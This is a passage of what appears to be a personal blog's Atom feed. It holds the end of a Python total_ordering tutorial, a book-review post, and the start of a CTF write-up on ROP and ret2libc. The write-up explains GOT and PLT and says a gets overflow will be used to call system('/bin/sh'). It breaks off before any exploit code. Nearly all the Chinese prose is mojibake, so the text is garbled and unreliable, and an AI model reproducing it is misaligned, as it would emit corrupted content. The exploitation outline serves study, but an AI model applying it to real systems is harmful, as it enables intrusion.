class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">h1 = House(<span class="string">'h1'</span>, <span class="string">'Cape'</span>)</span><br><span class="line">h1.add_room(Room(<span class="string">'Master Bedroom'</span>, <span class="number">14</span>, <span class="number">21</span>))</span><br><span class="line">h1.add_room(Room(<span class="string">'Living Room'</span>, <span class="number">18</span>, <span class="number">20</span>))</span><br><span class="line">h1.add_room(Room(<span class="string">'Kitchen'</span>, <span class="number">12</span>, <span class="number">16</span>))</span><br><span class="line">h1.add_room(Room(<span class="string">'Office'</span>, <span class="number">12</span>, <span class="number">12</span>))</span><br><span class="line">h2 = House(<span class="string">'h2'</span>, <span class="string">'Ranch'</span>)</span><br><span class="line">h2.add_room(Room(<span class="string">'Master Bedroom'</span>, <span class="number">14</span>, <span class="number">21</span>))</span><br><span class="line">h2.add_room(Room(<span class="string">'Living Room'</span>, <span class="number">18</span>, <span class="number">20</span>))</span><br><span class="line">h2.add_room(Room(<span class="string">'Kitchen'</span>, <span class="number">12</span>, <span class="number">16</span>))</span><br><span class="line">h3 = House(<span class="string">'h3'</span>, <span class="string">'Split'</span>)</span><br><span class="line">h3.add_room(Room(<span class="string">'Master Bedroom'</span>, <span class="number">14</span>, <span class="number">21</span>))</span><br><span class="line">h3.add_room(Room(<span class="string">'Living Room'</span>, <span class="number">18</span>, <span class="number">20</span>))</span><br><span class="line">h3.add_room(Room(<span class="string">'Office'</span>, <span class="number">12</span>, <span class="number">16</span>))</span><br><span class="line">h3.add_room(Room(<span class="string">'Kitchen'</span>, <span class="number">15</span>, <span class="number">17</span>))</span><br><span class="line">houses = [h1, h2, h3]</span><br><span class="line">print(<span class="string">'Is h1 bigger than h2?'</span>, h1 &gt; h2) <span class="comment"># prints True</span></span><br><span class="line">print(<span class="string">'Is h2 smaller than h3?'</span>, h2 &lt; h3) <span class="comment"># prints True</span></span><br><span class="line">print(<span class="string">'Is h2 greater than or equal to h1?'</span>, h2 &gt;= h1) <span class="comment"># Prints False</span></span><br><span class="line">print(<span class="string">'Which one is biggest?'</span>, max(houses)) <span class="comment"># Prints 'h3: 1101-square-foot Split'</span></span><br><span class="line">print(<span class="string">'Which is smallest?'</span>, min(houses)) <span class="comment"># Prints 'h2: 846-square-foot Ranch'</span></span><br></pre></td></tr></table></figure><p><code>total_ordering</code>è£…é¥°å™¨ä¹Ÿæ²¡é‚£ä¹ˆç¥ç§˜ã€‚å®ƒå°±æ˜¯å®šä¹‰äº†ä¸€ä¸ªä»æ¯ä¸ªæ¯”è¾ƒæ”¯æŒæ–¹æ³•åˆ°æ‰€æœ‰éœ€è¦å®šä¹‰çš„å…¶ä»–æ–¹æ³•çš„ä¸€ä¸ªæ˜ å°„è€Œå·²ã€‚æ¯”å¦‚ä½ å®šä¹‰äº†<code>__le__()</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒå°±è¢«ç”¨æ¥æ„å»ºæ‰€æœ‰å…¶ä»–çš„éœ€è¦å®šä¹‰çš„é‚£äº›ç‰¹æ®Šæ–¹æ³•ã€‚ å®é™…ä¸Šå°±æ˜¯åœ¨ç±»é‡Œé¢åƒä¸‹é¢è¿™æ ·å®šä¹‰äº†ä¸€äº›ç‰¹æ®Šæ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">House</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__lt__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># Methods created by @total_ordering</span></span><br><span class="line">    __le__ = <span class="keyword">lambda</span> self, other: self &lt; other <span class="keyword">or</span> self == other</span><br><span class="line">    __gt__ = <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> (self &lt; other <span class="keyword">or</span> self == other)</span><br><span class="line">    __ge__ = <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> (self &lt; other)</span><br><span class="line">    __ne__ = <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self == other</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h3&gt;&lt;p&gt;åœ¨&lt;code&gt;python cookbook&lt;/code&gt;ä¸­å­¦åˆ°çš„å¾ˆå¤š&lt;code&gt;python&lt;/code&gt;æŠ€å·§ï¼ŒåŸºæœ¬éƒ½æ˜¯å·¥ä½œä¸­åš&lt;code
      
    
    </summary>
    
    
      <category term="Python" scheme="elssm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>è¯»ä¹¦åˆ†äº«V</title>
    <link href="elssm.github.io/2023/08/27/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABV/"/>
    <id>elssm.github.io/2023/08/27/è¯»ä¹¦åˆ†äº«V/</id>
    <published>2023-08-27T11:27:54.000Z</published>
    <updated>2023-10-09T12:47:08.446Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æœˆäº®ä¸å…­ä¾¿å£«"><a href="#æœˆäº®ä¸å…­ä¾¿å£«" class="headerlink" title="æœˆäº®ä¸å…­ä¾¿å£«"></a>æœˆäº®ä¸å…­ä¾¿å£«</h4><p><img src="/2023/08/27/è¯»ä¹¦åˆ†äº«V/1.jpg" alt="1" style="zoom:70%;"></p><p><strong>æ»¡åœ°éƒ½æ˜¯å…­ä¾¿å£«ï¼Œä»–å´æŠ¬å¤´çœ‹è§äº†æœˆäº®ã€‚</strong></p><p>é“¶è¡Œå®¶æŸ¥å°”æ–¯ï¼Œäººåˆ°ä¸­å¹´ï¼Œäº‹ä¸šæœ‰æˆï¼Œä¸ºäº†è¿½æ±‚å†…å¿ƒéšç§˜çš„ç»˜ç”»æ¢¦æƒ³ï¼Œçªç„¶æŠ›å¦»åˆ«å­ï¼Œå¼ƒå®¶å‡ºèµ°ã€‚ä»–æ·±çŸ¥ï¼šäººçš„æ¯ä¸€ç§èº«ä»½éƒ½æ˜¯ä¸€ç§è‡ªæˆ‘ç»‘æ¶ï¼Œå”¯æœ‰å¤±å»æ˜¯é€šå‘è‡ªç”±ä¹‹é€”ã€‚åœ¨å¼‚å›½ä»–ä¹¡ï¼Œä»–è´«ç—…äº¤åŠ ï¼Œå¯¹æ¢¦æƒ³å´æ„ˆå‘åšå®šæ‰§ç€ã€‚ä»–è¯´ï¼šæˆ‘å¿…é¡»ç”»ç”»ï¼Œå°±åƒæººæ°´çš„äººå¿…é¡»æŒ£æ‰ã€‚åœ¨ç»å†ç§ç§ç¦»å¥‡é­é‡åï¼Œä»–æ¥åˆ°å—å¤ªå¹³æ´‹çš„ä¸€åº§å­¤å²›ï¼ŒåŒå½“åœ°ä¸€ä½å§‘å¨˜ç»“å©šç”Ÿå­ï¼ŒæˆåŠŸåˆ›ä½œå‡ºä¸€ç³»åˆ—æƒŠä¸–æ°ä½œã€‚å°±åœ¨æ­¤æ—¶ï¼Œä»–è¢«ç»ç—‡å’ŒåŒç›®å¤±æ˜å‡»å€’ï¼Œä¸´æ­»ä¹‹å‰ï¼Œä»–åšå‡ºäº†è®©æ‰€æœ‰äººéœ‡æƒŠçš„å†³å®šâ€¦â€¦äººä¸–æ¼«é•¿å¾—è½¬ç¬å³é€ï¼Œæœ‰äººè§å°˜åŸƒï¼Œæœ‰äººè§æ˜Ÿè¾°ã€‚æŸ¥å°”æ–¯å°±æ˜¯é‚£ä¸ªç»ˆå…¶ä¸€ç”Ÿåœ¨è¿½é€æ˜Ÿè¾°çš„äººã€‚</p><p>è¯¥è¯´ä¸è¯´ï¼Œæ¯›å§†æ‰‹ä¸‹çš„ä¸»äººå…¬éƒ½æŒºç‰›é€¼çš„ã€‚ã€‚ã€‚ã€‚æŸ¥å°”æ–¯æœ‰æ‹‰é‡Œå†…å‘³äº†</p><h4 id="å¤æ´›çš„ç½‘"><a href="#å¤æ´›çš„ç½‘" class="headerlink" title="å¤æ´›çš„ç½‘"></a>å¤æ´›çš„ç½‘</h4><p><img src="/2023/08/27/è¯»ä¹¦åˆ†äº«V/2.jpg" alt="2" style="zoom:80%;"></p><p><strong>å¾®å…‰é€è¿›ä¸€æ‰‡å°çª—å­ï¼Œæ˜Ÿæ˜Ÿä¸€é¢—æ¥ä¸€é¢—æ¶ˆå¤±</strong></p><p>ä¸€ä¸ªèœ˜è››å’Œå°çŒªçš„æ•…äº‹ï¼Œå†™ç»™å­©å­ï¼Œä¹Ÿå†™ç»™å¤§äººã€‚åœ¨æœ±å…‹æ›¼å®¶çš„è°·ä»“é‡Œï¼Œå¿«ä¹åœ°ç”Ÿæ´»ç€ä¸€ç¾¤åŠ¨ç‰©ï¼Œå…¶ä¸­å°çŒªå¨å°”ä¼¯å’Œèœ˜è››å¤æ´›å»ºç«‹äº†æœ€çœŸæŒšçš„å‹è°Šã€‚ç„¶è€Œï¼Œä¸€ä¸ªæœ€ä¸‘æ¶çš„æ¶ˆæ¯æ‰“ç ´äº†è°·ä»“çš„å¹³é™ï¼šå¨å°”ä¼¯æœªæ¥çš„å‘½è¿ç«Ÿæ˜¯æˆä¸ºç†è‚‰ç«è…¿ã€‚ä½œä¸ºä¸€åªçŒªï¼Œæ‚²ç—›ç»æœ›çš„å¨å°”ä¼¯ä¼¼ä¹åªèƒ½æ¥å—ä»»äººå®°å‰²çš„å‘½è¿äº†ï¼Œç„¶è€Œï¼Œçœ‹ä¼¼æ¸ºå°çš„å¤æ´›å´è¯´ï¼šâ€œæˆ‘æ•‘ä½ ã€‚â€äºæ˜¯ï¼Œå¤æ´›ç”¨è‡ªå·±çš„ä¸åœ¨çŒªæ ä¸Šç»‡å‡ºäº†è¢«äººç±»è§†ä¸ºå¥‡è¿¹çš„ç½‘ä¸Šæ–‡å­—ï¼Œå½»åº•é€†è½¬äº†å¨å°”ä¼¯çš„å‘½è¿ï¼Œç»ˆäºè®©å®ƒåœ¨é›†å¸‚çš„å¤§èµ›ä¸­èµ¢å¾—ç‰¹åˆ«å¥–ï¼Œå’Œä¸€ä¸ªå®‰äº«å¤©å‘½çš„æœªæ¥ã€‚ä½†ï¼Œè¿™æ—¶ï¼Œèœ˜è››å¤æ´›çš„ç”Ÿå‘½å´èµ°åˆ°äº†å°½å¤´â€¦â€¦</p><p>çœ‹è¿™æœ¬ä¹¦çš„æ—¶å€™ï¼Œå¤æ´›è„‘å­é‡Œä¸€ç›´è„‘è¡¥çš„æ˜¯æ²ˆè…¾ã€‚ã€‚ã€‚</p><h4 id="æ‰‹æœº"><a href="#æ‰‹æœº" class="headerlink" title="æ‰‹æœº"></a>æ‰‹æœº</h4><p><img src="/2023/08/27/è¯»ä¹¦åˆ†äº«V/3.jpg" alt="3" style="zoom:80%;"></p><p><strong>ä¸–ç•Œä¸Šåªæœ‰ä¸å­¦çš„äººï¼Œæ²¡æœ‰å­¦ä¸ä¼šçš„äº‹</strong></p><p>ã€Šæ‰‹æœºã€‹æ˜¯ä¸€éƒ¨å…³äºäººä»¬æ—¥å¸¸â€œè¯´è¯â€çš„å°è¯´ã€‚æ®ä½œè€…ç»Ÿè®¡ï¼Œäººä»æ—©ä¸Šçå¼€çœ¼ç›ï¼Œåˆ°æ™šä¸Šé—­ä¸Šçœ¼ç›ï¼Œè¦è¯´ä¸‰åƒå¤šå¥è¯ã€‚å¦‚æœæœ‰äººå¤œé‡Œè¯´æ¢¦è¯ï¼Œè¿˜å¾—å†åŠ ä¸Šä¸‰åå¤šå¥ã€‚åœ¨è¿™éƒ¨å°è¯´ä¸­æœ‰è®¸å¤šå˜´ï¼Œæœ‰äººä¸çˆ±è¯´è¯ï¼Œæœ‰äººåœ¨è¯´å‡è¯ï¼Œæœ‰äººåœ¨è¯´å‚»è¯ï¼Œæœ‰äººåœ¨è¯´å®è¯ï¼Œæœ‰äººæ˜¯è¯ä¸­æœ‰è¯ã€‚ä¸»äººå…¬ä¸¥å®ˆä¸€æ˜¯ä¸€ä¸ªä»¥â€œè¯´è¯â€ä¸ºç”Ÿçš„äººï¼Œåœ¨ç”µè§†å°ä¸»æŒèŠ‚ç›®ã€‚ä»–çš„èŠ‚ç›®ä»¥è¯´çœŸè¯è§é•¿ï¼Œä½†åœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼Œä»–ä¸ç”±è‡ªä¸»å¼€å§‹è¯´è°è¯ã€‚å½“è°è¯å’Œæ‰‹æœºè¿åœ¨ä¸€èµ·æ—¶ï¼Œæ‰‹æœºå°±å˜æˆäº†æ‰‹é›·ã€‚</p><p>åˆ˜éœ‡äº‘çš„ä¹¦å°±æ˜¯è€çœ‹ï½ï½ï½</p><h4 id="è®¤çŸ¥è§‰é†’"><a href="#è®¤çŸ¥è§‰é†’" class="headerlink" title="è®¤çŸ¥è§‰é†’"></a>è®¤çŸ¥è§‰é†’</h4><p><img src="/2023/08/27/è¯»ä¹¦åˆ†äº«V/4.jpg" alt="4" style="zoom:80%;"></p><p><strong>è€å¿ƒä¸æ˜¯æ¯…åŠ›å¸¦æ¥çš„ç»“æœï¼Œè€Œæ˜¯å…·æœ‰é•¿è¿œç›®å…‰çš„ç»“æœ</strong></p><p>è¿™æ˜¯ä¸€éƒ¨å¯ä»¥ç©¿é€æ—¶é—´çš„ä¸ªäººæˆé•¿æ–¹æ³•è®ºã€‚é€šè¿‡â€œå¤§è„‘æ„é€ ã€æ½œæ„è¯†ã€å…ƒè®¤çŸ¥â€ç­‰æ€ç»´è§„å¾‹ï¼Œä½ å°†çœŸæ­£çœ‹æ¸…è‡ªå·±ï¼›é€šè¿‡â€œæ·±åº¦å­¦ä¹ ã€å…³è”ã€åé¦ˆâ€äº‹ç‰©è§„å¾‹ï¼Œä½ å°†æ´æ‚‰å¦‚ä½•çœŸæ­£æˆäº‹ï¼å¦‚æœå¯¹è‡ªå·±ä¸äº†è§£ï¼Œæˆ‘ä»¬å°±ä¼šè¢«äººçš„åŸå§‹å¤©æ€§æŸç¼šï¼Œè¿™å¾€å¾€ä¼šè®©æˆ‘ä»¬æ„Ÿåˆ°å¾ˆç—›è‹¦ã€‚ç„¶è€Œï¼Œå¦‚æœäº†è§£å¤§è„‘çŸ¥è¯†ï¼Œæˆ‘ä»¬å°±å¯ä»¥è§‚å¯Ÿå¹¶æŒ‡å¯¼è‡ªå·±ï¼Œè¿ç”¨è®¤çŸ¥çš„åŠ›é‡å»å…‹æœå¤©æ€§ï¼Œä»è€Œè·å¾—é•¿ä¹…è€Œæ¸…æ™°çš„å†…åœ¨åŠ¨åŠ›ï¼Œè®©æˆ‘ä»¬å‘Šåˆ«ç»å¤§å¤šæ•°äººç”Ÿç—›è‹¦ã€‚</p><p>å¹²è´§æŒºå¤šï¼Œå°±æ˜¯ç°åœ¨å¿˜çš„ä¹Ÿå·®ä¸å¤šäº†ã€‚</p><h4 id="çº¢è‰²çš„èµ·ç‚¹ï¼šä¸­å›½å…±äº§å…šè¯ç”Ÿçºªå®"><a href="#çº¢è‰²çš„èµ·ç‚¹ï¼šä¸­å›½å…±äº§å…šè¯ç”Ÿçºªå®" class="headerlink" title="çº¢è‰²çš„èµ·ç‚¹ï¼šä¸­å›½å…±äº§å…šè¯ç”Ÿçºªå®"></a>çº¢è‰²çš„èµ·ç‚¹ï¼šä¸­å›½å…±äº§å…šè¯ç”Ÿçºªå®</h4><p><img src="/2023/08/27/è¯»ä¹¦åˆ†äº«V/5.jpg" alt="5"></p><p><strong>æ˜Ÿæ˜Ÿä¹‹ç«ï¼Œå¯ä»¥ç‡åŸ</strong></p><p>ä¸­å›½å…±äº§å…šä»èµ·åˆåªæœ‰50å¤šåå…šå‘˜ï¼Œå‘å±•åˆ°å¦‚ä»Šæ‹¥æœ‰8000å¤šä¸‡å…šå‘˜çš„æ‰§æ”¿å…šï¼Œæ·±åº¦å½±å“äº†è¿‘ä»£ä¸­å›½çš„å†å²è¿›ç¨‹ã€‚ä¸­å›½å…±äº§å…šå½“åˆæ˜¯æ€æ ·è¯ç”Ÿçš„ï¼Œæˆä¸ºä¸€ä¸ªä¼—æ‰€å…³æ³¨çš„è¯é¢˜ã€‚æœ¬ä¹¦ä½œè€…å¶æ°¸çƒˆä»¥â€œåœ°åˆ©ä¼˜åŠ¿â€ï¼Œåœ¨ä¸Šæµ·ä½œäº†é•¿æ—¶é—´ç»†è‡´çš„é‡‡è®¿ï¼Œåˆä¸“ç¨‹èµ´åŒ—äº¬åŠå˜‰å…´å—æ¹–è®¿é—®ï¼Œå†ç»åä½™å¹´è€ƒè¯ï¼Œä»¥å®¢è§‚çš„æ–‡å­—ï¼Œåˆ›æ–°çš„â€œTâ€å­—å‹å™äº‹ç»“æ„ï¼Œå¨“å¨“è®²è¿°ä¸­å›½å…±äº§å…šè¯ç”Ÿçš„è‰°è¾›ä¸è¾‰ç…Œâ€¦â€¦</p><p>è¿™æœ¬ä¹¦è®©æˆ‘å¯¹å—é™ˆåŒ—ææœ‰äº†æ›´æ·±çš„äº†è§£ï¼Œä¸­å›½å…±äº§å…šçš„æˆç«‹æ˜¯è‰°è¾›çš„ï¼Œæˆ‘ä»¬è¦çæƒœè¿™æ¥ä¹‹ä¸æ˜“çš„ç”Ÿæ´»ï¼</p><h4 id="è›¤èŸ†å…ˆç”Ÿå»çœ‹å¿ƒç†åŒ»ç”Ÿ"><a href="#è›¤èŸ†å…ˆç”Ÿå»çœ‹å¿ƒç†åŒ»ç”Ÿ" class="headerlink" title="è›¤èŸ†å…ˆç”Ÿå»çœ‹å¿ƒç†åŒ»ç”Ÿ"></a>è›¤èŸ†å…ˆç”Ÿå»çœ‹å¿ƒç†åŒ»ç”Ÿ</h4><p><img src="/2023/08/27/è¯»ä¹¦åˆ†äº«V/6.jpg" alt="6" style="zoom:80%;"></p><p><strong>äººä»¬å¤ªå®¹æ˜“è®©é‡è¦çš„äº‹ä»¶å°±è¿™ä¹ˆè¿‡å»ï¼Œå¿˜è®°å…³æ³¨æˆ–ä¸ºå®ƒä»¬åº†ç¥ï¼Œä¹Ÿè®¸æ˜¯å› ä¸ºæˆ‘ä»¬é€šå¸¸éƒ½åªåœ¨äº‹åæ‰æ˜ç™½å®ƒä»¬æœ‰å¤šé‡è¦</strong></p><p>è›¤èŸ†å…ˆç”Ÿä¸€å‘çˆ±ç¬‘çˆ±é—¹ï¼Œå¦‚ä»Šå´ä¸€åå¸¸æ€åœ°éƒéƒå¯¡æ¬¢ï¼Œä»–ä¸€ä¸ªäººèº²åœ¨å±‹é‡Œï¼Œè¿èµ·åºŠæ¢³æ´—çš„åŠ›æ°”éƒ½æ²¡æœ‰ã€‚æœ‹å‹ä»¬éå¸¸æ‹…å¿ƒä»–ï¼Œå»ºè®®ä»–å»åšå¿ƒç†å’¨è¯¢ã€‚åœ¨10æ¬¡å¿ƒç†å’¨è¯¢ä¸­ï¼Œè›¤èŸ†åœ¨å’¨è¯¢å¸ˆè‹é¹­çš„å¸¦é¢†ä¸‹ï¼Œå‹‡æ•¢åœ°æ¢ç´¢äº†è‡ªå·±çš„å†…å¿ƒä¸–ç•Œï¼Œä¹Ÿé€æ¸æ‰¾å›äº†ä¿¡å¿ƒä¸å¸Œæœ›â€¦â€¦è¿™å¹¶ä¸æ˜¯ä¸€æœ¬å†™ç»™å­©å­çœ‹çš„ä¹¦ï¼Œè€Œæ˜¯ä¸€æœ¬éå¸¸æœ‰æ·±åº¦çš„å¿ƒç†ç–—æ„ˆè¯»ç‰©ã€‚å‡ºç‰ˆ20å¤šå¹´æ¥ï¼Œå·²æˆä¸ºè‹±å›½å›½æ°‘çº§å¿ƒç†å’¨è¯¢å…¥é—¨ä¹¦ã€‚å®ƒåŸºäºTAæ²Ÿé€šåˆ†æå¿ƒç†å­¦çš„ç†è®ºï¼Œè®²è¿°äº†ä¸€ä¸ªæŠ‘éƒç—‡ç—…äººé€šè¿‡åæ¬¡å¿ƒç†å’¨è¯¢ï¼Œç»ˆäºæ‰¾å›å¿«ä¹å’Œè‡ªä¿¡çš„å…¨è¿‡ç¨‹ã€‚åœ¨ä¹¦ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å¿ƒç†å’¨è¯¢çš„å€¾å¬ã€å…±æƒ…ã€æ²Ÿé€šæŠ€å·§ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ ‡å‡†çš„å¿ƒç†å’¨è¯¢æµç¨‹çš„æ¨¡æ¿ã€‚è¯»è€…çŠ¹å¦‚äº²ä¸´ç°åœºï¼Œä½“éªŒå¿ƒç†å’¨è¯¢çš„æ¯ä¸€ä¸ªç»†èŠ‚ï¼Œè§è¯ç–—æ„ˆå’Œæ”¹å˜çš„å‘ç”Ÿã€‚</p><p>è£æ ¼è¯´ï¼šæ²¡æœ‰ä¸€ç§è§‰é†’æ˜¯ä¸å¸¦ç€ç—›è‹¦çš„ã€‚</p><h4 id="çº¢æ¥¼æ¢¦"><a href="#çº¢æ¥¼æ¢¦" class="headerlink" title="çº¢æ¥¼æ¢¦"></a>çº¢æ¥¼æ¢¦</h4><p><img src="/2023/08/27/è¯»ä¹¦åˆ†äº«V/7.jpg" alt="7" style="zoom:80%;"></p><p><strong>æ»¡çº¸è’å”è¨€ï¼Œä¸€æŠŠè¾›é…¸æ³ªã€‚éƒ½äº‘ä½œè€…ç—´ï¼Œè°è§£å…¶ä¸­å‘³ï¼Ÿ</strong></p><p>ã€Šçº¢æ¥¼æ¢¦ã€‹æ˜¯ä¸€éƒ¨ç™¾ç§‘å…¨ä¹¦å¼çš„é•¿ç¯‡å°è¯´ã€‚ä»¥å®é»›çˆ±æƒ…æ‚²å‰§ä¸ºä¸»çº¿ï¼Œä»¥å››å¤§å®¶æ—çš„è£è¾±å…´è¡°ä¸ºèƒŒæ™¯ï¼Œæç»˜å‡º18ä¸–çºªä¸­å›½å°å»ºç¤¾ä¼šçš„æ–¹æ–¹é¢é¢ï¼Œä»¥åŠå°å»ºä¸“åˆ¶ä¸‹æ–°å…´èµ„æœ¬ä¸»ä¹‰æ°‘ä¸»æ€æƒ³çš„èŒåŠ¨ã€‚ç»“æ„å®å¤§ã€æƒ…èŠ‚å§”å©‰ã€ç»†èŠ‚ç²¾è‡´ï¼Œäººç‰©å½¢è±¡æ ©æ ©å¦‚ç”Ÿï¼Œå£°å£æ¯•ç°ï¼Œå ªç§°ä¸­å›½å¤ä»£å°è¯´ä¸­çš„ç»å…¸ã€‚</p><p>goatçº§åˆ«çš„ä¹¦ï½</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;æœˆäº®ä¸å…­ä¾¿å£«&quot;&gt;&lt;a href=&quot;#æœˆäº®ä¸å…­ä¾¿å£«&quot; class=&quot;headerlink&quot; title=&quot;æœˆäº®ä¸å…­ä¾¿å£«&quot;&gt;&lt;/a&gt;æœˆäº®ä¸å…­ä¾¿å£«&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2023/08/27/è¯»ä¹¦åˆ†äº«V/1.jpg&quot; alt=&quot;1&quot; style=&quot;zoom
      
    
    </summary>
    
    
      <category term="éšç¬”" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>ROPå­¦ä¹ II</title>
    <link href="elssm.github.io/2023/07/13/ROP%E5%AD%A6%E4%B9%A0II/"/>
    <id>elssm.github.io/2023/07/13/ROPå­¦ä¹ II/</id>
    <published>2023-07-13T06:24:14.000Z</published>
    <updated>2023-10-09T12:53:52.584Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ä¸Šä¸€èŠ‚é€šè¿‡ä¸€ä¸ªç®€å•çš„<code>ret2syscall</code>é¢˜ç›®è®¤è¯†äº†ROPã€‚æœ¬èŠ‚å°†é€šè¿‡ä¸‰é“<code>ret2libc</code>é¢˜ç›®ç»§ç»­å­¦ä¹ ROPã€‚</p><p>å­¦ä¹ <code>ret2libc</code>é¢˜ç›®ä¹‹å‰éœ€è¦å¯¹<code>plt</code>å’Œ<code>got</code>æœ‰ä¸€å®šçš„äº†è§£ã€‚</p><p>GOTå…¨ç§°<code>Global Offset Table</code>ï¼Œå³å…¨å±€åç§»é‡è¡¨ã€‚å®ƒåœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­æ˜¯ä¸€ä¸ªå•ç‹¬çš„sectionï¼Œä½äº<code>.data</code> sectionçš„å‰é¢ã€‚æ¯ä¸ªè¢«ç›®æ ‡æ¨¡å—å¼•ç”¨çš„å…¨å±€ç¬¦å·ï¼ˆå‡½æ•°æˆ–è€…å˜é‡ï¼‰éƒ½å¯¹åº”äºGOTä¸­ä¸€ä¸ª8å­—èŠ‚çš„æ¡ç›®ã€‚ç¼–è¯‘å™¨è¿˜ä¸ºGOTä¸­æ¯ä¸ªæ¡ç›®ç”Ÿæˆä¸€ä¸ªé‡å®šä½è®°å½•ã€‚åœ¨åŠ è½½æ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šé‡å®šä½GOTä¸­çš„æ¯ä¸ªæ¡ç›®ï¼Œä½¿å¾—å®ƒåŒ…å«æ­£ç¡®çš„ç›®æ ‡åœ°å€ã€‚</p><p>PLTå…¨ç§°<code>Procedure Linkage Table</code>ï¼Œå³è¿‡ç¨‹é“¾æ¥è¡¨ã€‚å®ƒåœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä¹Ÿæ˜¯ä¸€ä¸ªå•ç‹¬çš„sectionï¼Œä½äº<code>.text</code>sectionçš„å‰é¢ã€‚æ¯ä¸ªè¢«å¯æ‰§è¡Œç¨‹åºè°ƒç”¨çš„åº“å‡½æ•°éƒ½æœ‰å®ƒè‡ªå·±çš„PLTæ¡ç›®ã€‚æ¯ä¸ªæ¡ç›®å®é™…ä¸Šéƒ½æ˜¯ä¸€å°æ®µå¯æ‰§è¡Œçš„ä»£ç ã€‚</p><p>é€šè¿‡ä¸‹å›¾è¯´æ˜ã€‚å½“ç¬¬ä¸€æ¬¡è°ƒç”¨funcå‡½æ•°æ—¶ã€‚ä¼šè·³è½¬åˆ°è¯¥å‡½æ•°å¯¹åº”çš„PLTå¤„ã€‚è¯¥å‡½æ•°å¯¹åº”çš„PLTç¬¬ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œå®ƒå¯¹åº”çš„.GOT.PLTé‡Œçš„æŒ‡ä»¤ã€‚ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ï¼Œè¯¥å‡½æ•°çš„.GOT.PLTé‡Œä¿å­˜çš„æ˜¯å®ƒå¯¹åº”çš„PLTé‡Œç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€ï¼›ç»§ç»­æ‰§è¡ŒPLTç¬¬äºŒæ¡ã€ç¬¬ä¸‰æ¡æŒ‡ä»¤ï¼Œå…¶ä¸­ç¬¬ä¸‰æ¡æŒ‡ä»¤ä½œç”¨æ˜¯è·³è½¬åˆ°å…¬å…±çš„PLTï¼ˆ.PLT[0]ï¼‰ã€‚ å…¬å…±çš„PLTï¼ˆ.PLT[0]ï¼‰æ‰§è¡Œ.GOT.PLT[2]æŒ‡å‘çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡ŒåŠ¨æ€é“¾æ¥å™¨çš„ä»£ç ï¼›åŠ¨æ€é“¾æ¥å™¨é‡Œçš„<code>_dl_runtime_resolve_avx</code>å‡½æ•°ä¿®æ”¹è¢«è°ƒå‡½æ•°å¯¹åº”çš„.GOT.PLTé‡Œä¿å­˜çš„åœ°å€ï¼Œä½¿ä¹‹æŒ‡å‘é“¾æ¥åçš„åŠ¨æ€é“¾æ¥åº“é‡Œè¯¥å‡½æ•°çš„å®é™…åœ°å€ï¼›å†æ¬¡è°ƒç”¨è¯¥å‡½æ•°å¯¹åº”çš„PLTç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œè·³è½¬åˆ°å®ƒå¯¹åº”çš„.GOT.PLTé‡Œçš„æŒ‡ä»¤ï¼ˆæ­¤æ—¶å·²ç»æ˜¯è¯¥å‡½æ•°åœ¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„çœŸæ­£åœ°å€ï¼‰ï¼Œä»è€Œå®ç°è¯¥å‡½æ•°çš„è°ƒç”¨ã€‚</p><p><img src="/2023/07/13/ROPå­¦ä¹ II/1.png" alt="1"></p><h4 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h4><p>æœ¬é¢˜éœ€è¦é€šè¿‡getså‡½æ•°æº¢å‡ºï¼Œåˆ©ç”¨ç¨‹åºä¸­çš„<code>system</code>å‡½æ•°å’Œ<code>/bin/sh</code>å­—ç¬¦ä¸²è·å–æƒé™ã€‚</p><p>é€šè¿‡<code>strings</code>åˆ¤æ–­ç¨‹åºä¸­æ˜¯å¦å­˜åœ¨<code>system</code>å‡½æ•°å’Œ<code>/bin/sh</code>å­—ç¬¦ä¸²ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 